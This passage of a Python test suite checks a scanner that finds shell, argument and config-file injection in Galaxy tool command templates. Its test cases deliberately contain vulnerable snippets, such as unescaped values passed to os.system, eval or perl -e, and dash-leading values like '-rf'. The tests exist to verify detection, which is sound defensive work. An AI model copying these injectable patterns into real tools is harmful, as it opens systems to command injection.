    assert rules(review(tmp_path, command)) - {("option-injection", "low")} == expected


@pytest.mark.parametrize(
    "command,expected",
    [
        ("tool '$sq'", set()),
        # Joined with a value no user controls, the escaping still holds.
        ("#set $x = $sq if $count else 'none'\ntool '$x'", set()),
        ("tool '${str($sq).strip()}'", set()),
        # Removing the double quotes of '"'"' breaks the escaping.
        ("tool '${str($sq).replace('\"', '')}'", {("shell-injection", "high")}),
    ],
)
def test_escaped_single_quote_survives_joins_and_methods(tmp_path, command, expected):
    assert rules(review(tmp_path, command)) - {("option-injection", "low")} == expected


@pytest.mark.parametrize(
    "command,expected",
    [
        (
            (
                "#import re\n#set $n = str($input.element_identifier)\n"
                "#if re.match('^[\\w.-]+$', $n)\nln -s '$input' '$n'\n#end if"
            ),
            set(),
        ),
        # re.search without ^ finds the pattern anywhere: the value is not narrowed.
        (
            (
                "#import re\n#set $n = str($input.element_identifier)\n"
                "#if re.search('[\\w.-]+$', $n)\nln -s '$input' '$n'\n#end if"
            ),
            {("shell-injection", "high"), ("path-traversal", "medium")},
        ),
        (
            (
                "#import re\n#if str($input.element_identifier) != re.sub('[^\\w.-]', '_', str($input.element_identifier))\n"
                "exit 1\n#else\nln -s '$input' '$input.element_identifier'\n#end if"
            ),
            set(),
        ),
        # The skipped iterations never reach the command; after the loop nothing is narrowed.
        (
            (
                "#import re\n#for $f in $flat\n#if not re.fullmatch('[\\w.]+', str($f.element_identifier))\n#continue\n"
                "#end if\ntool '$f.element_identifier'\n#end for"
            ),
            set(),
        ),
        (
            (
                "#import re\n#for $f in $flat\n#if not re.fullmatch('[\\w.]+', str($f.element_identifier))\n#continue\n"
                "#end if\n#end for\ntool '$f.element_identifier'"
            ),
            {("shell-injection", "high")},
        ),
        ("#if str($text) in ['a', 'b']\ntool $text\n#end if", set()),
        # int() stops the rendering for anything that is not a number.
        ("#if int(str($text)) > 0\ntool $text\n#end if", set()),
        ("#set $n = int(str($text))\ntool $text", set()),
        # ...but not when it may not run.
        ("#set $n = int(str($text)) if $count else 0\ntool $text", {("argument-injection", "medium")}),
    ],
)
def test_tests_narrow_the_value(tmp_path, command, expected):
    assert rules(review(tmp_path, command)) - {("option-injection", "low")} == expected


@pytest.mark.parametrize(
    "command,expected",
    [
        # In <when value="y"> the parameter `value` is an integer.
        ("#if $mode.kind == 'y'\ntool $mode.value\n#end if", set()),
        ("#if str($mode.kind) != 'x'\ntool $mode.value\n#end if", set()),
        ("#if $mode.kind == 'x'\ntool $mode.value\n#end if", {("argument-injection", "medium")}),
        ("tool $mode.value", {("argument-injection", "medium")}),
    ],
)
def test_conditional_selector_picks_the_when_block(tmp_path, command, expected):
    assert rules(review(tmp_path, command)) - {("option-injection", "low")} == expected


@pytest.mark.parametrize(
    "command,expected",
    [
        # What a test shows about `$text` is about the sanitized text, not about its raw value.
        ("#import re\n#if re.match('^\\w+$', str($text))\ntool ${text.value}\n#end if", ("shell-injection", "high")),
        ("#import re\n#if re.match('^\\w+$', str($text))\ntool ${text.lower()}\n#end if", ("shell-injection", "high")),
        ("#if $text == 'X'\ntool ${text.value}\n#end if", ("shell-injection", "high")),
        (
            "#import re\n#set $p = $free\n#if re.match('^\\w+$', str($p))\ntool ${p.value}\n#end if",
            ("shell-injection", "high"),
        ),
        # Only the first alternative is anchored; MULTILINE lets ^ and $ match at any line.
        ("#import re\n#if re.search('^a$|b$', str($free))\ntool $free\n#end if", ("shell-injection", "high")),
        ("#import re\n#if re.match('(?m)[a-z]+$', str($free))\ntool '$free'\n#end if", ("shell-injection", "high")),
        ("#import re\n#if re.match('[a-z]+(?m:$)', str($free))\ntool '$free'\n#end if", ("shell-injection", "high")),
        # A #raise inside #try may be caught; a conversion in a handler or a chained compare may not run.
        (
            (
                "#import re\n#try\n#if not re.match('^\\w+$', str($free))\n#raise ValueError\n#end if\n"
                "#except\n#pass\n#end try\ntool $free"
            ),
            ("shell-injection", "high"),
        ),
        ("#try\n#pass\n#except\n#silent int($free)\n#end try\ntool '$free'", ("shell-injection", "high")),
        ("#if 5 < int($count) < int($free)\n#pass\n#end if\ntool '$free'", ("shell-injection", "high")),
        # A loop body may run zero times or leave early.
        ("#set $s = str($free)\n#for $r in $rows\n#silent int($s)\n#end for\ntool '$s'", ("shell-injection", "high")),
        (
            (
                "#import re\n#set $s = str($free)\n#for $r in $rows\n#if not re.match('^\\w+$', $s)\n#continue\n"
                "#end if\n#end for\ntool $s"
            ),
            ("shell-injection", "high"),
        ),
        (
            (
                "#import re\n#set $s = str($free)\n#for $r in $rows\n#if not re.match('^\\w+$', $s)\n#break\n"
                "#end if\n#end for\ntool $s"
            ),
            ("shell-injection", "high"),
        ),
        ("#set $s = str($free)\n#for $r in $rows\n#set $s = 'safe'\n#end for\ntool $s", ("shell-injection", "high")),
        (
            "#set global $g = $word\n#if $g == 'x'\n#set global $g = $free\ntool $g\n#end if",
            ("shell-injection", "high"),
        ),
        # The replacement itself stays in the value.
        (
            "#import re\n#if str($free) == re.sub('[^\\w]', ';', str($free))\ntool $free\n#end if",
            ("shell-injection", "high"),
        ),
        # shlex.quote leaves `,` unquoted; a quote in literal text no longer lines up with the escaping.
        ("#import shlex\ntool ${shlex.quote(str($free)).replace(',', ';')}", ("shell-injection", "high")),
        ("#import shlex\ntool ${''.join([\"'\", shlex.quote(str($free))])}", ("shell-injection", "high")),
    ],
)
def test_narrowing_does_not_hide_raw_values(tmp_path, command, expected):
    assert expected in rules(review(tmp_path, command))


@pytest.mark.parametrize(
    "command,content,expected",
    [
        # One value that can end in a backslash breaks the string syntax only.
        ("python '$script'", "adata.obs['$no_quote'] = 1", {("configfile-injection", "low")}),
        # A second value on the line: the first escapes its closing quote, the second is Python code.
        (
            "python '$script'",
            "adata.obs['$no_quote'] = adata.obs['$no_quote']",
            {("configfile-injection", "low"), ("configfile-injection", "high")},
        ),
    ],
)
def test_value_after_an_escaped_closing_quote_in_a_script(tmp_path, command, content, expected):
    assert rules(review(tmp_path, command, CONFIG.format(f"<![CDATA[{content}]]>"))) == expected


def test_backslash_inside_sh_single_quotes_escapes_nothing(tmp_path):
    report = review(tmp_path, "sh '$script'", CONFIG.format("<![CDATA[x='$no_quote' y='$no_quote']]>"))
    assert not any("can end in a backslash" in (f.context or "") for f in report.findings)


@pytest.mark.parametrize(
    "command,expected",
    [
        ('tool "$no_dq"', {("argument-injection", "low")}),
        # The first value escapes its closing quote; the second is then written unquoted.
        ('tool "$no_dq" "$no_dq"', {("argument-injection", "low"), ("shell-injection", "high")}),
        # Inside single quotes a backslash is an ordinary character.
        ("tool '$no_quote' '$no_quote'", set()),
        # The backslashes the template writes before quotes escape them on purpose.
        (
            '#set $t = $no_expansion.replace(\'"\', \'\\\\"\')\ntool "$t" "$t"',
            set(),
        ),
    ],
)
def test_value_after_an_escaped_closing_quote_in_the_command(tmp_path, command, expected):
    assert rules(review(tmp_path, command)) - {("option-injection", "low")} == expected


@pytest.mark.parametrize(
    "command,content,expected",
    [
        # The quotes keep the value inside the string, but eval runs the string.
        ("python '$script'", "color = eval('$no_quote')", {("configfile-injection", "high")}),
        ("python '$script'", "color = eval(f'$no_quote')", {("configfile-injection", "high")}),
        ("Rscript '$script'", "x <- eval(parse(text = '$no_quote'))", {("configfile-injection", "high")}),
        ("sh '$script'", 'eval "echo $letters"', set()),
        # literal_eval only reads literals.
        ("python '$script'", "color = ast.literal_eval('$no_quote')", set()),
        ("python '$script'", "color = '$no_quote'", set()),
    ],
)
def test_value_in_a_string_the_script_evaluates(tmp_path, command, content, expected):
    found = rules(review(tmp_path, command, CONFIG.format(f"<![CDATA[{content}]]>")))
    assert found - {("configfile-injection", "low")} == expected


@pytest.mark.parametrize(
    "content,expected",
    [
        # The shell that runs the string splits the value into words; a raw value can start a command.
        ("import os\nos.system('tool $text')", {("configfile-injection", "medium")}),
        ("import os\nos.system('tool $expr_no_quote')", {("configfile-injection", "high")}),
        ("import subprocess\nsubprocess.run('tool $text', shell=True)", {("configfile-injection", "medium")}),
        ("import os\nos.popen('tool $text').read()", {("configfile-injection", "medium")}),
        ("import subprocess\nsubprocess.getoutput('tool $text')", {("configfile-injection", "medium")}),
        ("import os\nos.system(f'tool $text')", {("configfile-injection", "medium")}),
        ("import os\nos.system(\n    'tool $text')", {("configfile-injection", "medium")}),
        ("import subprocess\nsubprocess.run(args='tool $text', shell=True)", {("configfile-injection", "medium")}),
        # Inside the shell's quotes, as the string's own text and its escapes give them.
        ("import os\nos.system(\"tool '$no_dq'\")", {("configfile-injection", "high")}),
        ("import os\nos.system('tool \\'$text\\'')", set()),
        ('import os\nos.system("tool \'\\x27$text")', {("configfile-injection", "medium")}),
        # A raw string writes its backslashes: the shell reads them.
        ("import os\nos.system(r'tool \\'$text\\'')", {("configfile-injection", "medium")}),
        # A backslash in the value is an escape of the string, which writes any character.
        ("import os\nos.system('tool \\'$expr_no_quote\\'')", {("configfile-injection", "high")}),
        ("import os\nos.system('tool \"$expr_no_quote\"')", {("configfile-injection", "high")}),
        ("import os\nos.system('tool \"$letters\"')", set()),
        # A list of arguments runs no shell, nor does a string the script only prints.
        ("import subprocess\nsubprocess.run(['tool', '$text'])", set()),
        ("print('tool $text')", set()),
    ],
)
def test_value_in_a_string_a_shell_runs(tmp_path, content, expected):
    found = rules(review(tmp_path, "python '$script'", CONFIG.format(f"<![CDATA[{content}]]>")))
    assert found - {("configfile-injection", "low")} == expected


@pytest.mark.parametrize(
    "content,expected",
    [
        # json.dumps() keeps braces, which the f-string it is written in or makes evaluates.
        ("#import json\nx = f'${json.dumps(str($expr_no_quote))}'", {("configfile-injection", "high")}),
        ("#import json\nx = f${json.dumps(str($free))}", {("configfile-injection", "high")}),
        ("#import json\nx = ${json.dumps(str($free))}", set()),
    ],
)
def test_json_in_an_f_string(tmp_path, content, expected):
    found = rules(review(tmp_path, "python '$script'", CONFIG.format(f"<![CDATA[{content}]]>")))
    assert found - {("configfile-injection", "low")} == expected


def test_braces_in_an_f_string_are_code(tmp_path):
    braces = (
        '<inputs><param name="p" type="text"><sanitizer><valid initial="string.printable">'
        '<remove value="&apos;"/><remove value="&quot;"/><remove value="\\"/></valid></sanitizer></param></inputs>'
    )
    path = os.path.join(tmp_path, "fstring.xml")
    for content, expected in [
        ("print(f\"No genes starting with '$p' found.\")", {("configfile-injection", "high")}),
        ("print(\"No genes starting with '$p' found.\")", set()),
    ]:
        with open(path, "w") as fh:
            fh.write(
                f'<tool id="f" name="f" version="1" profile="24.2"><command>python \'$script\'</command>'
                f'<configfiles><configfile name="script"><![CDATA[{content}]]></configfile></configfiles>{braces}</tool>'
            )
        assert rules(review_tool_source(get_tool_source(path))) == expected


DYNAMIC_CONDITIONAL = """<tool id="t" name="t" version="1" profile="24.2">
  <command><![CDATA[echo '$meta.anything' > '$out']]></command>
  <inputs>
    <param name="kind" type="select"><option value="a">a</option></param>
    <conditional name="meta" value_from="self:app.datatypes_registry.get_upload_metadata_params" value_ref="kind"/>
  </inputs>
  <outputs><data name="out" format="txt"/></outputs>
</tool>
"""


def test_conditional_built_at_run_time_is_any_value(tmp_path):
    path = os.path.join(tmp_path, "tool.xml")
    with open(path, "w") as fh:
        fh.write(DYNAMIC_CONDITIONAL)
    report = review_tool_source(get_tool_source(path))
    findings = [f for f in report.findings if f.rule == "shell-injection"]
    assert findings and not any(f.checkable for f in findings)


@pytest.mark.parametrize("program", ["perl -e 'print $word;'", "ruby -e 'puts $word'"])
def test_letters_alone_are_code_in_perl_and_ruby(tmp_path, program):
    report = review(tmp_path, program)
    findings = [f for f in report.findings if f.rule == "nested-interpreter"]
    assert findings and not any(f.checkable for f in findings)


@pytest.mark.parametrize(
    "program,interpolating",
    [
        ("""perl -e 'print "$free";'""", {"$", "@"}),
        ("""ruby -e 'puts "$free"'""", {"#"}),
        ("""python -c 'print("$free")'""", set()),
    ],
)
def test_double_quoted_strings_that_run_code(tmp_path, program, interpolating):
    report = review(tmp_path, program)
    breakout = set().union(*(f.breakout for f in report.findings if f.rule == "nested-interpreter"))
    assert interpolating <= breakout
    if not interpolating:
        assert not breakout & {"$", "@", "#"}


@pytest.mark.parametrize(
    "command,code",
    [
        ("perl -e 'print $word;'", True),
        ("perl -w -e 'print $word;'", True),
        ("perl '$input' -e '$word'", False),
        ("python -c 'print(\"$free\")'", True),
        ("python script.py -c 'print(\"$free\")'", False),
        ("bash -c 'echo \"$free\"'", True),
        ("bash run.sh -c 'echo \"$free\"'", False),
    ],
)
def test_an_interpreter_flag_after_the_script_belongs_to_the_script(tmp_path, command, code):
    report = review(tmp_path, command)
    assert any(f.rule == "nested-interpreter" for f in report.findings) == code


@pytest.mark.parametrize("reader", ["bash", "dash", "ksh"])
def test_a_configfile_any_shell_runs_is_a_script(tmp_path, reader):
    script = CONFIG.format("echo $free")
    report = review(tmp_path, f"{reader} '$script'", script)
    assert ("configfile-injection", "high") in rules(report) or ("shell-injection", "high") in rules(report)


@pytest.mark.parametrize("interpreter", ["lua", "julia"])
def test_inline_code_of_other_interpreters(tmp_path, interpreter):
    report = review(tmp_path, f"""{interpreter} -e 'print("$free")'""")
    assert any(f.rule == "nested-interpreter" for f in report.findings)


@pytest.mark.parametrize(
    "value,expected",
    [
        ("-rf", {LEADING_DASH, DASH_WORD}),
        # The shell removes the quote: `'$x'` with `'-rf` gives `''-rf'`.
        ("'-rf", {LEADING_DASH, DASH_WORD}),
        ("a' '-rf", {DASH_WORD}),
        # A template can strip the space.
        (" -rf", {LEADING_DASH, DASH_WORD}),
        ("a-b c-d", set()),
        ("x ~/y", {TILDE_WORD}),
        ("a~b", set()),
        # A backslash that escapes a character of the value; a last one escapes the template's.
        ("a\\x3b", {ESCAPE}),
        ("a\\", set()),
    ],
)
def test_marks_tell_what_a_word_starts_with(value, expected):
    assert marks(value) == expected


@pytest.mark.parametrize(
    "command,expected",
    [
        ("export $text=1", {("variable-name", "high"), ("argument-injection", "medium")}),
        ("local '$text'", {("variable-name", "high")}),
        ("declare -x NAME$text=1", {("variable-name", "high"), ("argument-injection", "medium")}),
        # `command` makes export split its operands, as env always does.
        ("command export A=$text", {("argument-injection", "high")}),
        ("env A=$text tool", {("argument-injection", "high")}),
        ("export A=$text", {("argument-injection", "medium")}),
        ("export A='$text'", set()),
        # The shell does not split a prefix assignment, which the review still rates as an unquoted word.
        ("A=$text tool", {("argument-injection", "medium")}),
    ],
)
def test_variable_assignments(tmp_path, command, expected):
    found = rules(review(tmp_path, command)) - {("option-injection", "low")}
    assert {r for r in found if r[0] in ("variable-name", "argument-injection")} == expected


@pytest.mark.parametrize("template_job_parameters,expected", [(frozenset(), set()), (frozenset({"foo"}), {"foo"})])
def test_strict_check_reads_the_job_parameters_a_template_names(tmp_path, template_job_parameters, expected):
    path = os.path.join(tmp_path, "tool.xml")
    with open(path, "w") as fh:
        fh.write(f"""<tool id="t" name="t" version="1" profile="24.2"><command>tool</command>
  <inputs>{INPUTS}</inputs><outputs><data name="out" format="txt"/></outputs></tool>""")
    model = build_model(get_tool_source(path), template_job_parameters)
    refs = model.sources(frozenset({"foo", "free", "__user_email__"}), frozenset({"foo", "free"}))
    assert {ref.key for ref in refs if ref.accessor == "special"} - {"__user_email__"} == expected


def test_strict_check_reads_the_job_parameters_of_the_names_a_template_looks_up(tmp_path):
    # Not Cheetah's own names and locals, attributes, the template object's, nor a local set on every path to
    # the lookup: a loop variable in its loop, a lambda's argument, a comprehension's target. The namespace
    # answers with its keys before the attributes of the TreeDict Galaxy retries it as ($data).
    command = """#def show($arg)
echo '$arg' '$data' '$self.searchList';
#end def
$show('x')
echo '$trans' '$write' '$SL' '$_filter';
#set $local = 'a'
#if $text == 'x'
#set $maybe = 'b'
#end if
#set $upper = [$f.upper() for $f in $text.split(',')]
#set $fn = lambda g: $g.lower()
#for $e in $text.split(',')
echo '$e.upper()' '$local' '$maybe' '$undeclared' '$getVar("by_name", "")' '$fn($e)' '$upper';
#end for
echo '$searchList' > /dev/null"""
    report = review(tmp_path, command)
    assert "command" in report.unchecked_locations
    assert {ref.key for ref in report.reads["command"] if ref.accessor == "special"} == {
        "maybe",
        "undeclared",
        "by_name",
        "data",
    }
